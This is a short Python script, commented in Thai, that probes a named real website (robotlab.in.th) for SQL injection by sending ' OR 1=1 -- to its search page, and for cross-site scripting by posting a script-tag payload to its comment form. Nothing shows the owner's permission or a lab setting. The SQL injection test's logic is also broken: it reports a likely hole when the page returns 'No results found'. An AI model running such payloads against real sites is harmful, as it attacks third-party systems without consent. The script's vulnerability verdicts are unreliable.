import requests

target_url = "https://www.robotlab.in.th/"

# ตรวจสอบช่องโหว่ SQL Injection
payload = "' OR 1=1 --"
url = target_url + "/search?q=" + payload
response = requests.get(url)
if "No results found" in response.text:
    print("เป็นไปได้ว่าเป้าหมายมีช่องโหว่ SQL Injection")
else:
    print("เป้าหมายไม่ควรมีช่องโหว่ SQL Injection")

# ตรวจสอบช่องโหว่ Cross-Site Scripting (XSS)
payload = "<script>alert('XSS')</script>"
url = target_url + "/comment"
data = {"comment": payload}
response = requests.post(url, data=data)
if payload in response.text:
    print("เป็นไปได้ว่าเป้าหมายมีช่องโหว่ XSS")
else:
    print("เป้าหมายไม่ควรมีช่องโหว่ XSS")
